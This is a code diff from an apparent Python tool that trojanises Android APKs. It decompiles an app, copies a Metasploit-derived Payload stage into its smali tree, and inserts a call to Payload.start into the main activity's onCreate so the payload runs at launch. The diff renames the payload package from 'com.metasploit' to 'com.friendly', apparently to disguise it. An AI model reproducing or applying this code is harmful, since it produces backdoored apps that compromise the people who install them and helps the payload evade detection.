@@ -31,11 +31,11 @@ def decompile(mainapk):
 
 def inject(mainapk):
 	print pyc.Info("Injecting payload...")
-	mk = "mkdir %s/smali/com/metasploit"%mainapk.split('.')[0]
+	mk = "mkdir %s/smali/com/friendly"%mainapk.split('.')[0]
 	os.system(mk)
-	mk = "mkdir %s/smali/com/metasploit/stage"%mainapk.split('.')[0]
+	mk = "mkdir %s/smali/com/friendly/stage"%mainapk.split('.')[0]
 	os.system(mk)
-	cp = "cp temp/smali/com/metasploit/stage/Payload*  %s/smali/com/metasploit/stage/"%mainapk.split('.')[0]
+	cp = "cp temp/smali/com/friendly/stage/Payload*  %s/smali/com/friendly/stage/"%mainapk.split('.')[0]
 	os.system(cp)
 	filemanifest = "%s/AndroidManifest.xml"%mainapk.split('.')[0]
 	fhandle = open(filemanifest,'r')
@@ -52,12 +52,12 @@ def inject(mainapk):
 	print pyc.Info("Injecting hooks in %s..."%activityname)
 	fhalf = fread.split(";->onCreate(Landroid/os/Bundle;)V")[0]
 	shalf = fread.split(";->onCreate(Landroid/os/Bundle;)V")[1]
-	injection = ";->onCreate(Landroid/os/Bundle;)V\n    invoke-static {p0}, Lcom/metasploit/stage/Payload;->start(Landroid/content/Context;)V"
+	injection = ";->onCreate(Landroid/os/Bundle;)V\n    invoke-static {p0}, Lcom/friendly/stage/Payload;->start(Landroid/content/Context;)V"
 	total = fhalf + injection + shalf
 	fhandle = open(smalipath,'w')
 	fhandle.write(total)
 	fhandle.close()
-	print pyc.Succ("Hook injected -> metasploit/stage/Payload")
+	print pyc.Succ("Hook injected -> friendly/stage/Payload")
 
 def permissions(mainapk):
 	print pyc.Info("Adding permissions...")
